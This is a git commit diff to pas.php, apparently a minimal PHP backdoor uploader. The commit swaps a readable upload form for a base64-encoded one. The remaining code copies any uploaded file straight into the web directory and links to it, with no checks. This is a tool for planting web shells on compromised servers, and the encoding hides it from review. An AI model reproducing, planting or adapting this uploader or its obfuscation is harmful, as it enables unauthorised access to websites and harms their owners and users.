dcc067f75c9b2ad60c3514838ed53170ff80a9e0
imam mrtdho <88535491+Mr-7Mind@users.noreply.github.com>
2023-05-19 18:15:14 +0800

    Update pas.php

--- pas.php
+++ pas.php
@@ -1,8 +1,5 @@
 <?php
-echo "<form method='POST' enctype='multipart/form-data'>
-          <input type='file' name='file'>
-          <input type='submit' value='Upload'>
-        </form>";
+echo(base64_decode("PGZvcm0gbWV0aG9kPSdQT1NUJyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz48aW5wdXQgdHlwZT0nZmlsZSduYW1lPSdmJyAvPjxpbnB1dCB0eXBlPSdzdWJtaXQnIHZhbHVlPSd1cCcgLz48L2Zvcm0+"));
  @copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);
  echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");
 }
